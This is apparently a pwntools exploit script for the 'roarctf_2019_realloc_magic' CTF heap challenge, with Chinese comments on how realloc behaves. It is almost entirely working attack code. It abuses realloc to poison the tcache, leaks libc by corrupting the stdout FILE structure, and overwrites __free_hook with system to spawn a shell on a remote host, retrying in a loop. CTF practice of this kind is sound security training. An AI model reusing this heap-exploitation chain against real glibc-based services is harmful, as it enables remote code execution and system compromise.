from pwn import *
# context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])
context(log_level='debug')

def pwn():
    io=remote("node4.buuoj.cn",28342)
        # io=process("./roarctf_2019_realloc_magic")
    elf=ELF("./roarctf_2019_realloc_magic")
    libc=ELF("./libc-2.27.so")
    def add(s,cc):
        io.sendlineafter(b">> ",b"1")
        io.sendlineafter(b"Size?\n",str(s))
        io.sendafter(b"Content?\n",cc)

    def delete():
        io.sendlineafter(b">> ",b"2")

    def cl():
        io.sendlineafter(b">> ",b"666")

    # gdb.attach(io)
    # pause()

    add(0x100,b"qwe")
    add(0,b"")

    add(0x10,b"aaa")
    add(0,b"")

    add(0x100,b"qwe")

    add(0x60,b"qqq")
    add(0,b"")

    add(0x90,b"qqq")

    for i in range(7):
        delete()

    add(0,b"")

    add(0x60,b"qqq")

    add(0x100,cyclic(0x68)+p64(0x91)+b"\x60\xc7")
    add(0,b"")

    add(0x90,b"aaa")
    add(0,b"")

    add(0x90,p64(0xfbad1887)+p64(0)*3+b"\x00")
    leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x1c80-libc.sym[b"__malloc_hook"]
    print("leak_addr: "+hex(leak_addr))
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=one_gadget[1]+leak_addr
    malloc_hook=libc.sym[b"__malloc_hook"]+leak_addr
    free_hook=libc.sym[b"__free_hook"]+leak_addr
    sys_addr=libc.sym[b"system"]+leak_addr

    cl()

    add(0x100,b"ppp")

    add(0x60,b"qqq")
    add(0,b"")

    add(0x90,b"www")

    for i in range(2):
        delete()

    add(0,b"")

    add(0x60,b"a")

    add(0x100,cyclic(0x68)+p64(0x81)+p64(free_hook-0x8))
    add(0,b"")

    add(0x90,b"/bin/sh\x00")
    add(0,b"")

    add(0x90,b"/bin/sh\x00"+p64(sys_addr))
    # add(0,b"")
    delete()
    # io.sendlineafter(b">> ",b"1")
    # io.sendlineafter(b"Size?\n",b"1")


    io.interactive()

while True:
    try:
        pwn()
    except:
        io.close()
        continue

# ①当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址
# ②当ptr != nullptr && size == 0的时候，相当于free(ptr)，返回空指针
# ③当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去
# ④当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面又足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针

# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
